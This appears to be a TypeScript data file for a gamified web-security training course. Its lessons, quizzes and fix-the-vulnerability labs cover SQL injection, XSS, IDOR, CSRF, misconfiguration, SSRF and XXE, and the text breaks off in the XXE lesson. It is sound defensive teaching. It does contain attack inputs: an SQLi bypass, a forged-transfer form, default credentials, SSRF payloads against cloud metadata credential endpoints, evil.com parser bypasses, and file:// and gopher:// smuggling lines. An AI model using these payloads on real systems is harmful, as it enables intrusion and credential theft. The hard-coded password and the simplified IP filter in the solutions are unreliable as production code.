import type { Module } from '../types';

export const MODULES: Module[] = [
    {
        id: 'owasp-intro',
        title: 'Introduction to OWASP',
        description: 'Learn about the Open Web Application Security Project and the Top 10 vulnerabilities.',
        difficulty: 'Beginner',
        xpReward: 100,
        locked: false,
        lessons: [
            {
                id: 'owasp-1',
                title: 'What is OWASP?',
                type: 'theory',
                content: `
# What is OWASP?

The **Open Web Application Security Project (OWASP)** is a non-profit foundation that works to improve the security of software. 

It is best known for the **OWASP Top 10**, a regularly updated report outlining security concerns for web application security, focusing on the 10 most critical risks.

## Why it matters
Understanding these vulnerabilities is crucial for developers because they are frequently exploited by attackers to steal data, take over accounts, or compromise systems.
        `
            },
            {
                id: 'owasp-quiz-1',
                title: 'Knowledge Check',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "What does OWASP stand for?",
                    options: [
                        "Open Web Application Security Project",
                        "Online Website Assessment Security Protocol",
                        "Official Web Authorization Security Platform",
                        "Only Web Apps Stay Private"
                    ],
                    correctAnswer: 0,
                    explanation: "OWASP stands for the Open Web Application Security Project, a global non-profit dedicated to software security."
                }
            }
        ]
    },
    {
        id: 'sql-injection',
        title: 'SQL Injection (SQLi)',
        description: 'Understand how attackers interfere with application database queries.',
        difficulty: 'Intermediate',
        xpReward: 300,
        locked: false,
        lessons: [
            {
                id: 'sqli-theory',
                title: 'Understanding SQL Injection',
                type: 'theory',
                content: `
# SQL Injection

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

## How it works
Untrusted user input is directly concatenated into a SQL query string without validation or escaping.

\`\`\`sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
\`\`\`

By inputting \`' OR '1'='1\`, the attacker makes the condition always true, bypassing authentication.
        `
            },
            {
                id: 'sqli-lab',
                title: 'Fix the Vulnerability',
                type: 'lab',
                content: 'The code below constructs a query using string concatenation. This is vulnerable to SQL Injection. Refactor it to use parameterized queries (prepared statements).',
                lab: {
                    initialCode: `
function getUser(username) {
  // VULNERABLE: Direct concatenation
  const query = "SELECT * FROM users WHERE username = '" + username + "'";
  
  return db.execute(query);
}
            `,
                    solutionCode: `
function getUser(username) {
  // SECURE: Parameterized query
  const query = "SELECT * FROM users WHERE username = ?";
  
  return db.execute(query, [username]);
}
            `,
                    instructions: "Modify the code to use a parameterized query with '?' placeholder instead of string concatenation."
                }
            }
        ]
    },
    {
        id: 'xss-basics',
        title: 'Cross-Site Scripting (XSS)',
        description: 'Learn how attackers inject malicious scripts and how to prevent it in React.',
        difficulty: 'Intermediate',
        xpReward: 350,
        locked: false,
        lessons: [
            {
                id: 'xss-theory',
                title: 'What is XSS?',
                type: 'theory',
                content: `
# Cross-Site Scripting (XSS)

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in the victim's browser.

## The React Defense
By default, React escapes variables embedded in JSX, which protects against most XSS attacks.

\`\`\`jsx
// Safe by default
<div>{userInput}</div>
\`\`\`

## The Danger Zone
React provides an escape hatch called \`dangerouslySetInnerHTML\`. As the name implies, it is dangerous.

\`\`\`jsx
// VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userInput }} />
\`\`\`

Using this property with unsanitized input opens your app to XSS.
                `
            },
            {
                id: 'xss-quiz',
                title: 'XSS Knowledge Check',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which React prop is explicitly named to warn developers about potential XSS risks?",
                    options: [
                        "unsafeRenderHTML",
                        "dangerouslySetInnerHTML",
                        "innerHtmlUnsafe",
                        "allowScripts"
                    ],
                    correctAnswer: 1,
                    explanation: "dangerouslySetInnerHTML is React's replacement for using innerHTML in the browser DOM. It is deliberately named to remind you of the security risks."
                }
            },
            {
                id: 'xss-lab',
                title: 'Patch the XSS Vulnerability',
                type: 'lab',
                content: 'The component below renders user comments safely, except for one line where `dangerouslySetInnerHTML` is used. Fix it by using standard JSX rendering, which auto-escapes content.',
                lab: {
                    initialCode: `
function Comment({ userComment }) {
  return (
    <div className="comment">
      <h3>User says:</h3>
      {/* VULNERABLE: Parsing HTML directly */}
      <div dangerouslySetInnerHTML={{ __html: userComment }} />
    </div>
  );
}
                    `,
                    solutionCode: `
function Comment({ userComment }) {
  return (
    <div className="comment">
      <h3>User says:</h3>
      {/* SECURE: React escapes this context automatically */}
      <div>{userComment}</div>
    </div>
  );
}
                    `,
                    instructions: "Remove the unsafe HTML rendering and render the comment as a standard child of the div tag."
                }
            }
        ]
    },
    {
        id: 'idor-basics',
        title: 'Insecure Direct Object Reference (IDOR)',
        description: 'Learn how attackers access unauthorized data by manipulating IDs.',
        difficulty: 'Advanced',
        xpReward: 400,
        locked: false,
        lessons: [
            {
                id: 'idor-theory',
                title: 'What is IDOR?',
                type: 'theory',
                content: `
# Insecure Direct Object References (IDOR)

IDOR occurs when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly, for example database records or files.

## The Scenario
Imagine a URL like this:
\`https://api.example.com/invoices?id=1234\`

If you change \`1234\` to \`1235\` and see someone else's invoice, that's IDOR. The system failed to check if *you* (the logged-in user) are actually authorized to see invoice \`1235\`.

## Prevention
Always validate that the current user has permission to access the requested resource.
                `
            },
            {
                id: 'idor-quiz',
                title: 'IDOR Knowledge Check',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which of the following is the best defense against IDOR?",
                    options: [
                        "Obfuscating IDs (using UUIDs instead of numbers)",
                        "Implementing proper access control checks on every request",
                        "Using HTTPS for all requests",
                        "Disabling API access"
                    ],
                    correctAnswer: 1,
                    explanation: "While using UUIDs makes guessing harder, it doesn't solve the underlying permission issue. You must enforce access control checks on the server."
                }
            },
            {
                id: 'idor-lab',
                title: 'Prevent Unauthorized Access',
                type: 'lab',
                content: 'The function below fetches a document based on an ID provided in the request. It currently returns any document found. Secure it by checking if the document belongs to the requesting user.',
                lab: {
                    initialCode: `
function getDocument(user, docId) {
  // VULNERABLE: No ownership check
  const doc = db.findDocument(docId);
  
  if (!doc) {
    return { error: "Not found" };
  }
  
  return doc;
}
                    `,
                    solutionCode: `
function getDocument(user, docId) {
  const doc = db.findDocument(docId);
  
  if (!doc) {
    return { error: "Not found" };
  }

  // SECURE: Check ownership
  if (doc.ownerId !== user.id) {
    return { error: "Unauthorized" };
  }
  
  return doc;
}
                    `,
                    instructions: "Add a check to ensure `doc.ownerId` matches `user.id`. Return `{ error: 'Unauthorized' }` if they don't match."
                }
            }
        ]
    },
    {
        id: 'broken-auth',
        title: 'Broken Authentication',
        description: 'Understand the risks of weak session management and credential stuffing.',
        difficulty: 'Advanced',
        xpReward: 300,
        locked: false,
        lessons: [
            {
                id: 'auth-theory',
                title: 'Authentication Failures',
                type: 'theory',
                content: `
# Broken Authentication

Authentication vulnerabilities allowed attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users' identities temporarily or permanently.

## Common Issues
1. **Credential Stuffing**: Attackers use lists of compromised username/password pairs.
2. **Weak Passwords**: Allowing "password123" or default credentials.
3. **Session Hijacking**: Exposing session IDs in URLs or not invalidating them after logout.

## Best Practices
- Implement Multi-Factor Authentication (MFA).
- Enforce strong password complexity.
- Limit failed login attempts.
                `
            },
            {
                id: 'auth-quiz',
                title: 'Auth Logic Challenge',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "You notice an application allows you to try logging in an unlimited number of times without any delay. What vulnerability is this?",
                    options: [
                        "Session Fixation",
                        "Lack of Rate Limiting (Brute Force Susceptibility)",
                        "SQL Injection",
                        "Cross-Site Request Forgery"
                    ],
                    correctAnswer: 1,
                    explanation: "Unlimited login attempts allow attackers to brute-force passwords using automated scripts. Implementing rate limiting or account lockouts is the defense."
                }
            }
        ]
    },
    {
        id: 'csrf-attacks',
        title: 'Cross-Site Request Forgery (CSRF)',
        description: 'Learn how attackers trick users into performing unwanted actions and how to defend against it.',
        difficulty: 'Intermediate',
        xpReward: 350,
        locked: false,
        lessons: [
            {
                id: 'csrf-theory',
                title: 'Understanding CSRF Attacks',
                type: 'theory',
                content: `
# Cross-Site Request Forgery (CSRF)

CSRF is an attack that tricks authenticated users into executing unwanted actions on a web application where they are currently logged in. The attacker forges a request that appears to come from the victim.

## Mission Briefing: The Attack Vector

Imagine you are logged into your bank account. An enemy agent sends you an innocent-looking email with a hidden image tag:

\`\`\`html
<img src="https://yourbank.com/transfer?to=attacker&amount=10000" />
\`\`\`

When your browser loads this "image," it sends a real transfer request to the bank—with your valid session cookies attached. The bank cannot distinguish this from a legitimate request.

## Real-World Intel

**Case File #1: TikTok (2020)**
A CSRF vulnerability allowed attackers to change users' account settings and expose private data by tricking users into clicking a malicious link.

**Case File #2: Netflix (2006)**
Attackers could add DVDs to users' rental queues, change shipping addresses, or alter account credentials—all without user consent.

## Why Session Cookies Are Not Enough

Cookies are sent automatically with every request to a domain. The server sees valid authentication but has no way to verify the user *intended* to make that request.

## The Defense: CSRF Tokens

A CSRF token is a unique, unpredictable value generated by the server and embedded in forms. Attackers cannot forge this token because they have no way to read it from another site (thanks to the Same-Origin Policy).
                `
            },
            {
                id: 'csrf-quiz-1',
                title: 'CSRF Intelligence Test',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "What makes CSRF attacks possible?",
                    options: [
                        "Browsers do not send cookies with cross-origin requests",
                        "Browsers automatically include cookies with requests to a domain, regardless of the request's origin",
                        "Attackers can read cookies from other websites",
                        "Session tokens are stored in localStorage"
                    ],
                    correctAnswer: 1,
                    explanation: "Browsers automatically attach cookies to every request to a domain, even if the request originates from a different site. This is what makes CSRF possible—the server receives valid authentication cookies but cannot verify the user's intent."
                }
            },
            {
                id: 'csrf-quiz-2',
                title: 'Defense Strategy Assessment',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which of the following is the MOST effective defense against CSRF attacks?",
                    options: [
                        "Using HTTPS for all requests",
                        "Validating the Referer header",
                        "Implementing synchronizer tokens (CSRF tokens) validated on the server",
                        "Setting cookies to HttpOnly"
                    ],
                    correctAnswer: 2,
                    explanation: "While other options provide some security benefits, synchronizer tokens (CSRF tokens) are the primary defense. The server generates a unique token per session/request, embeds it in forms, and validates it on submission. Attackers cannot obtain this token due to Same-Origin Policy."
                }
            },
            {
                id: 'csrf-quiz-3',
                title: 'Attack Vector Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "An attacker creates a malicious page with: <form action='https://bank.com/transfer' method='POST'><input type='hidden' name='to' value='attacker'/></form><script>document.forms[0].submit()</script>. What happens if a logged-in bank user visits this page?",
                    options: [
                        "Nothing—the browser blocks cross-origin form submissions",
                        "The form submits but without cookies, so it fails authentication",
                        "The form submits with the user's cookies, potentially completing the transfer",
                        "The Same-Origin Policy prevents the form from loading"
                    ],
                    correctAnswer: 2,
                    explanation: "Cross-origin form submissions ARE allowed by browsers (unlike AJAX requests). The form will submit with the user's cookies attached. Without CSRF protection, the bank's server has no way to distinguish this forged request from a legitimate one."
                }
            },
            {
                id: 'csrf-quiz-4',
                title: 'SameSite Cookie Knowledge',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Modern browsers support the SameSite cookie attribute. What does 'SameSite=Strict' do?",
                    options: [
                        "Encrypts the cookie value",
                        "Prevents the cookie from being sent with any cross-site request",
                        "Only allows the cookie on HTTPS connections",
                        "Hides the cookie from JavaScript"
                    ],
                    correctAnswer: 1,
                    explanation: "SameSite=Strict prevents the browser from sending the cookie with any cross-site request, providing strong CSRF protection. However, it can affect user experience (e.g., clicking a link from email won't include auth cookies). SameSite=Lax is often a better balance."
                }
            },
            {
                id: 'csrf-lab',
                title: 'Implement CSRF Protection',
                type: 'lab',
                content: 'The form handler below processes a sensitive action (transferring funds) but has no CSRF protection. Your mission: Add CSRF token validation to prevent forged requests.',
                lab: {
                    initialCode: `
function handleTransfer(req, res) {
  // VULNERABLE: No CSRF protection!
  const { to, amount } = req.body;

  // Verify user is authenticated
  if (!req.session.userId) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  // Process the transfer
  const result = transferFunds(req.session.userId, to, amount);

  return res.json({ success: true, result });
}
                    `,
                    solutionCode: `
function handleTransfer(req, res) {
  const { to, amount, csrfToken } = req.body;

  // Verify user is authenticated
  if (!req.session.userId) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  // SECURE: Validate CSRF token
  if (!csrfToken || csrfToken !== req.session.csrfToken) {
    return res.status(403).json({ error: "Invalid CSRF token" });
  }

  // Process the transfer
  const result = transferFunds(req.session.userId, to, amount);

  return res.json({ success: true, result });
}
                    `,
                    instructions: "Add CSRF token validation: 1) Extract csrfToken from req.body, 2) Compare it against req.session.csrfToken, 3) Return a 403 error with message 'Invalid CSRF token' if validation fails."
                }
            }
        ]
    },
    {
        id: 'security-misconfig',
        title: 'Security Misconfiguration',
        description: 'Identify and fix dangerous server configurations that expose your systems to attack.',
        difficulty: 'Intermediate',
        xpReward: 350,
        locked: false,
        lessons: [
            {
                id: 'misconfig-theory',
                title: 'The Silent Saboteur',
                type: 'theory',
                content: `
# Security Misconfiguration

Security misconfiguration is one of the most common and dangerous vulnerabilities in the OWASP Top 10. It occurs when security settings are defined, implemented, or maintained improperly—leaving your systems exposed to attack without a single line of vulnerable code.

## Mission Briefing: The Threat Landscape

Unlike vulnerabilities that require exploiting application logic, security misconfigurations are often **low-hanging fruit** for attackers. They scan for default credentials, verbose error messages, and unnecessary services—harvesting intel your own systems freely provide.

## Common Misconfiguration Vectors

### 1. Default Credentials
Factory-set usernames and passwords (admin/admin, root/password) are the first thing attackers try.

\`\`\`plaintext
# Default credentials attackers check first:
admin:admin
root:root
administrator:password
sa:sa (SQL Server)
\`\`\`

### 2. Verbose Error Messages
Stack traces and detailed error messages reveal your technology stack, file paths, and database structure.

\`\`\`
Error: ENOENT: no such file or directory
    at /var/www/app/server/routes/api.js:45:12
    Connection string: postgres://dbuser:s3cr3t@db.internal:5432
\`\`\`

### 3. Missing Security Headers
HTTP headers that browsers use to protect users are often not configured:

- **X-Content-Type-Options**: Prevents MIME-type sniffing attacks
- **X-Frame-Options**: Prevents clickjacking by blocking iframe embedding
- **Content-Security-Policy**: Controls what resources can be loaded
- **Strict-Transport-Security**: Forces HTTPS connections

### 4. Unnecessary Features Enabled
Debug modes, sample applications, and admin consoles left active in production.

## Case Files: Real-World Breaches

**Equifax Breach (2017)**
A vulnerable Apache Struts version was left unpatched. 147 million Americans had their personal data exposed. The patch had been available for *two months* before the breach.

**Capital One (2019)**
A misconfigured web application firewall (WAF) allowed an attacker to access S3 buckets, exposing 100 million customer accounts.

**Microsoft Power Apps (2021)**
Default settings left millions of records publicly accessible because developers did not change the "off by default" privacy settings.

## Defense Strategy

1. **Disable debug mode** in production environments
2. **Remove or change** all default credentials
3. **Configure security headers** on all responses
4. **Minimize the attack surface** by disabling unused features
5. **Automated scanning** for misconfigurations in CI/CD pipelines
                `
            },
            {
                id: 'misconfig-quiz-1',
                title: 'Reconnaissance Assessment',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "During a security audit, you discover a production server returning stack traces with full file paths and database connection strings in error responses. What vulnerability category does this represent?",
                    options: [
                        "SQL Injection",
                        "Broken Authentication",
                        "Security Misconfiguration (Information Disclosure)",
                        "Cross-Site Scripting"
                    ],
                    correctAnswer: 2,
                    explanation: "Verbose error messages that expose internal system details are a classic example of security misconfiguration. This information disclosure helps attackers understand your technology stack, file structure, and potentially discover credentials—all without exploiting any code vulnerability."
                }
            },
            {
                id: 'misconfig-quiz-2',
                title: 'Header Defense Check',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which HTTP security header prevents your web page from being embedded in an iframe on a malicious site (clickjacking protection)?",
                    options: [
                        "Content-Security-Policy",
                        "X-Frame-Options",
                        "X-Content-Type-Options",
                        "Strict-Transport-Security"
                    ],
                    correctAnswer: 1,
                    explanation: "X-Frame-Options (with values like 'DENY' or 'SAMEORIGIN') prevents clickjacking attacks by controlling whether your page can be embedded in iframes. Content-Security-Policy can also do this with the 'frame-ancestors' directive, but X-Frame-Options is the classic, widely-supported solution."
                }
            },
            {
                id: 'misconfig-quiz-3',
                title: 'Attack Surface Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "You find an application with DEBUG=true in the production configuration. Which of the following is NOT a risk this creates?",
                    options: [
                        "Detailed error messages may expose sensitive information",
                        "Performance may be degraded due to extra logging",
                        "Debug endpoints may allow code execution or data access",
                        "The application will automatically use weak encryption"
                    ],
                    correctAnswer: 3,
                    explanation: "Debug mode typically causes information disclosure through verbose errors, performance impacts from extensive logging, and potentially exposes debug endpoints—but it does not automatically weaken encryption algorithms. However, all the other risks make debug mode in production a serious security misconfiguration."
                }
            },
            {
                id: 'misconfig-quiz-4',
                title: 'Breach Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "The 2017 Equifax breach, which exposed 147 million Americans' data, was primarily caused by:",
                    options: [
                        "A sophisticated zero-day exploit",
                        "An unpatched known vulnerability in Apache Struts",
                        "Social engineering of an employee",
                        "Weak password policies"
                    ],
                    correctAnswer: 1,
                    explanation: "The Equifax breach was caused by an unpatched Apache Struts vulnerability (CVE-2017-5638). The patch had been available for two months before attackers exploited it. This is a textbook case of security misconfiguration—failing to apply security updates in a timely manner."
                }
            },
            {
                id: 'misconfig-quiz-5',
                title: 'Defense Priority Assessment',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which approach is MOST effective for preventing security misconfigurations in a production environment?",
                    options: [
                        "Relying on developers to manually check settings before deployment",
                        "Using automated security scanning in CI/CD pipelines with hardened configuration templates",
                        "Only allowing senior developers to deploy to production",
                        "Keeping all configuration files secret"
                    ],
                    correctAnswer: 1,
                    explanation: "Automated scanning combined with hardened configuration templates (infrastructure as code) provides consistent, repeatable security. Manual checks are error-prone, access restrictions do not prevent mistakes, and security through obscurity is not a reliable defense."
                }
            },
            {
                id: 'misconfig-lab',
                title: 'Harden the Server Configuration',
                type: 'lab',
                content: 'Intelligence reports indicate this server configuration has multiple security issues: debug mode is enabled, default admin credentials are in place, and security headers are missing. Your mission: Fix all three vulnerabilities to secure the server.',
                lab: {
                    initialCode: `
const serverConfig = {
  // Server settings
  port: 3000,
  environment: 'production',
  debug: true,  // VULNERABLE: Debug enabled in production

  // Admin credentials
  admin: {
    username: 'admin',
    password: 'admin'  // VULNERABLE: Default credentials
  },

  // Response headers
  headers: {
    'X-Powered-By': 'Express'
    // VULNERABLE: Missing security headers
  }
};

module.exports = serverConfig;
                    `,
                    solutionCode: `
const serverConfig = {
  // Server settings
  port: 3000,
  environment: 'production',
  debug: false,  // SECURE: Debug disabled in production

  // Admin credentials
  admin: {
    username: 'sysop_7x9k2',
    password: 'K#9xL$mP2@vN8qR!'  // SECURE: Strong, unique credentials
  },

  // Response headers
  headers: {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'
  }
};

module.exports = serverConfig;
                    `,
                    instructions: "Fix the configuration: 1) Set debug to false, 2) Change admin credentials to non-default values (username should not be 'admin', password should not be 'admin' or 'password'), 3) Add security headers: X-Content-Type-Options, X-Frame-Options, and remove X-Powered-By."
                }
            }
        ]
    },
    {
        id: 'ssrf-attacks',
        title: 'Server-Side Request Forgery (SSRF)',
        description: 'Master the art of detecting and preventing attacks where servers are tricked into making unauthorized requests.',
        difficulty: 'Advanced',
        xpReward: 400,
        locked: false,
        lessons: [
            {
                id: 'ssrf-theory',
                title: 'Understanding SSRF Attacks',
                type: 'theory',
                content: `
# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

## Mission Briefing: The Attack Vector

In a typical SSRF attack, the attacker abuses functionality on the server to read or update internal resources. The attacker can supply or modify a URL which the code running on the server will read or submit data to.

Unlike client-side attacks (like XSS), SSRF exploits the **trust** that internal networks and cloud services place in requests originating from an application server.

## The Kill Chain

\`\`\`
1. Application accepts URL as input (e.g., "fetch this image")
2. Server makes request to attacker-controlled URL
3. Attacker points URL to internal resource (localhost, internal IPs)
4. Server returns sensitive internal data to attacker
\`\`\`

## Critical Target: Cloud Metadata Endpoints

Modern cloud infrastructure exposes metadata services at well-known IP addresses. These are the crown jewels for attackers:

### AWS Instance Metadata Service (IMDS)
\`\`\`
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
\`\`\`

### Google Cloud Metadata
\`\`\`
http://metadata.google.internal/computeMetadata/v1/
\`\`\`

### Azure Instance Metadata
\`\`\`
http://169.254.169.254/metadata/instance
\`\`\`

These endpoints can expose:
- IAM credentials with cloud API access
- API tokens and secrets
- Instance identity information
- User data scripts (often containing secrets)

## Case Files: Real-World Breaches

### Capital One Breach (2019)
**Impact:** 100+ million customer records exposed

A former AWS employee exploited an SSRF vulnerability in Capital One's web application firewall. The attacker:
1. Sent a crafted request that caused the server to query the AWS metadata service
2. Retrieved IAM role credentials from \`169.254.169.254\`
3. Used those credentials to access S3 buckets containing customer data

The breach resulted in an $80 million fine and compromised:
- 140,000 Social Security numbers
- 80,000 bank account numbers
- Credit card applications spanning 14 years

### Microsoft Exchange ProxyLogon (2021)
**Impact:** Tens of thousands of organizations worldwide

A chain of vulnerabilities including SSRF allowed attackers to:
1. Bypass authentication via SSRF to internal Exchange services
2. Write arbitrary files to the server
3. Execute code as SYSTEM

Nation-state actors exploited these flaws before patches were available.

### Shopify (2015)
**Impact:** Internal network reconnaissance

A bug bounty researcher discovered that Shopify's image processing feature could be abused to scan internal networks and access internal services not exposed to the internet.

## SSRF Attack Variants

### Basic SSRF
Direct request to internal resources:
\`\`\`javascript
// Vulnerable endpoint
app.get('/fetch', (req, res) => {
  const url = req.query.url;
  fetch(url).then(response => response.text())
    .then(data => res.send(data));
});

// Attack: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`

### Blind SSRF
Server makes request but doesn't return response to attacker. Detected via:
- Out-of-band callbacks (DNS, HTTP to attacker server)
- Timing differences
- Error message variations

### SSRF via URL Parsers
Exploiting differences in how URLs are parsed:
\`\`\`
http://evil.com#@internal-server
http://internal-server:password@evil.com
http://127.0.0.1:80@evil.com
\`\`\`

### Protocol Smuggling
Using non-HTTP protocols:
\`\`\`
file:///etc/passwd
gopher://internal-server:6379/_*1%0d%0a$8%0d%0aFLUSHALL
dict://internal-server:11211/stats
\`\`\`

## Defense Strategies

### 1. Allowlist Validation
Only permit requests to known, trusted domains:
\`\`\`javascript
const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.myapp.com'];

function isAllowedUrl(url) {
  const parsed = new URL(url);
  return ALLOWED_DOMAINS.includes(parsed.hostname);
}
\`\`\`

### 2. Block Internal IP Ranges
Deny requests to:
- \`127.0.0.0/8\` (localhost)
- \`10.0.0.0/8\` (private)
- \`172.16.0.0/12\` (private)
- \`192.168.0.0/16\` (private)
- \`169.254.0.0/16\` (link-local, includes cloud metadata)

### 3. Disable Unnecessary Protocols
Only allow \`http://\` and \`https://\`:
\`\`\`javascript
if (!url.startsWith('http://') && !url.startsWith('https://')) {
  throw new Error('Invalid protocol');
}
\`\`\`

### 4. Use Network Segmentation
Deploy applications in network segments that cannot reach sensitive internal services.

### 5. AWS IMDSv2
Use token-based metadata service that requires a PUT request first:
\`\`\`bash
# IMDSv2 requires a session token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \\
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \\
  "http://169.254.169.254/latest/meta-data/"
\`\`\`
                `
            },
            {
                id: 'ssrf-quiz-1',
                title: 'SSRF Fundamentals',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "What makes SSRF particularly dangerous in cloud environments?",
                    options: [
                        "Cloud servers are slower at processing requests",
                        "Cloud metadata endpoints expose IAM credentials and secrets to any server that can reach 169.254.169.254",
                        "Cloud providers do not support HTTPS",
                        "Cloud firewalls are easier to bypass"
                    ],
                    correctAnswer: 1,
                    explanation: "Cloud metadata services (like AWS's 169.254.169.254) are accessible from any application running on the instance. SSRF allows attackers to make requests to these endpoints and steal IAM credentials, giving them access to cloud resources. This was the core of the Capital One breach."
                }
            },
            {
                id: 'ssrf-quiz-2',
                title: 'Attack Pattern Recognition',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "An application has an 'Import from URL' feature that fetches images. Which input would indicate an SSRF attack attempt?",
                    options: [
                        "https://imgur.com/gallery/abc123",
                        "http://169.254.169.254/latest/meta-data/",
                        "https://example.com/logo.png",
                        "https://cdn.mysite.com/images/header.jpg"
                    ],
                    correctAnswer: 1,
                    explanation: "The IP 169.254.169.254 is the AWS metadata endpoint. An attacker requesting this URL is attempting SSRF to steal cloud credentials. Legitimate image URLs would point to actual image hosting services."
                }
            },
            {
                id: 'ssrf-quiz-3',
                title: 'Defense Strategy Assessment',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which defense provides the STRONGEST protection against SSRF attacks?",
                    options: [
                        "Blocking the IP 169.254.169.254 specifically",
                        "Using HTTPS for all outbound requests",
                        "Allowlisting specific trusted domains and blocking all internal/private IP ranges",
                        "Validating that the URL ends with a valid image extension"
                    ],
                    correctAnswer: 2,
                    explanation: "A combination of domain allowlisting AND blocking internal IP ranges provides defense in depth. Blocking only the metadata IP misses other internal services. HTTPS doesn't prevent SSRF. Extension validation is trivially bypassed."
                }
            },
            {
                id: 'ssrf-quiz-4',
                title: 'Bypass Technique Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "An application blocks 'localhost' and '127.0.0.1'. Which URL could bypass this protection?",
                    options: [
                        "http://LOCALHOST/admin",
                        "http://0.0.0.0/admin",
                        "http://[::1]/admin (IPv6 localhost)",
                        "All of the above could potentially bypass the filter"
                    ],
                    correctAnswer: 3,
                    explanation: "SSRF filters are often bypassed using: case variations (LOCALHOST), alternative representations (0.0.0.0, 0177.0.0.1, 2130706433), IPv6 (::1, [::1]), or DNS rebinding. Robust protection requires blocking ALL private/internal ranges and using proper URL parsing."
                }
            },
            {
                id: 'ssrf-quiz-5',
                title: 'Real-World Breach Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "In the 2019 Capital One breach, what did the attacker retrieve using SSRF?",
                    options: [
                        "Database passwords stored in environment variables",
                        "IAM role credentials from the AWS metadata service",
                        "SSH keys from the /etc/ssh directory",
                        "API keys from the application's configuration file"
                    ],
                    correctAnswer: 1,
                    explanation: "The attacker used SSRF to query http://169.254.169.254/latest/meta-data/iam/security-credentials/ and obtained temporary AWS credentials assigned to the server's IAM role. These credentials allowed access to S3 buckets containing customer data."
                }
            },
            {
                id: 'ssrf-lab',
                title: 'Implement SSRF Protection',
                type: 'lab',
                content: 'The function below fetches content from a user-provided URL without any validation. Your mission: Implement URL validation to prevent SSRF attacks by allowlisting domains and blocking internal IP addresses.',
                lab: {
                    initialCode: `
async function fetchUrl(userUrl) {
  // VULNERABLE: No URL validation
  const response = await fetch(userUrl);
  return response.text();
}
                    `,
                    solutionCode: `
async function fetchUrl(userUrl) {
  // SECURE: Validate URL before fetching
  const url = new URL(userUrl);

  // Only allow HTTPS protocol
  if (url.protocol !== 'https:') {
    throw new Error('Only HTTPS URLs are allowed');
  }

  // Allowlist of trusted domains
  const allowedDomains = ['api.trusted.com', 'cdn.example.com'];
  if (!allowedDomains.includes(url.hostname)) {
    throw new Error('Domain not in allowlist');
  }

  // Block internal/private IP ranges
  const ip = url.hostname;
  if (isPrivateIP(ip)) {
    throw new Error('Internal IPs are blocked');
  }

  const response = await fetch(userUrl);
  return response.text();
}

function isPrivateIP(hostname) {
  // Block localhost variations
  if (hostname === 'localhost' || hostname === '127.0.0.1') {
    return true;
  }
  // Block metadata endpoint
  if (hostname === '169.254.169.254') {
    return true;
  }
  // Block private ranges (simplified check)
  if (hostname.startsWith('10.') || hostname.startsWith('192.168.')) {
    return true;
  }
  return false;
}
                    `,
                    instructions: "Implement SSRF protection with these requirements:\n1. Parse the URL using new URL()\n2. Check protocol is 'https:' (throw 'Only HTTPS URLs are allowed')\n3. Validate hostname against an allowedDomains array (throw 'Domain not in allowlist')\n4. Create an isPrivateIP() function that blocks localhost, 127.0.0.1, 169.254.169.254, and private ranges (10.x, 192.168.x)\n5. Throw 'Internal IPs are blocked' for private IPs"
                }
            }
        ]
    },
    {
        id: 'xxe-attacks',
        title: 'XML External Entity (XXE) Injection',
        description: 'Master the detection and prevention of XXE attacks that exploit XML parsers to leak data, perform SSRF, and cause denial of service.',
        difficulty: 'Advanced',
        xpReward: 400,
        locked: false,
        lessons: [
            {
                id: 'xxe-theory',
                title: 'Understanding XXE Attacks',
                type: 'theory',
                content: `
# XML External Entity (XXE) Injection

XML External Entity (XXE) injection is a web security vulnerability that allows attackers to interfere with an application's processing of XML data. It exploits features of XML parsers that allow the definition and resolution of external entities.

## Mission Briefing: Understanding XML and DTDs

Before we dive into the attack, let's understand the technology being exploited.

### What is XML?

XML (eXtensible Markup Language) is a format for storing and transporting data. Unlike HTML, XML tags are not predefined—you create your own structure:

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <username>agent007</username>
  <clearance>top-secret</clearance>
</user>
\`\`\`

### What is a DTD?

A Document Type Definition (DTD) defines the structure and legal elements of an XML document. DTDs can define **entities**—variables that get replaced when the XML is parsed:

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY name "James Bond">
]>
<user>
  <greeting>Hello, &name;!</greeting>
</user>
\`\`\`

When parsed, \`&name;\` is replaced with "James Bond".

### The Danger: External Entities

XML allows entities to reference **external resources**—files, URLs, or other data:

\`\`\`xml
<!DOCTYPE data [
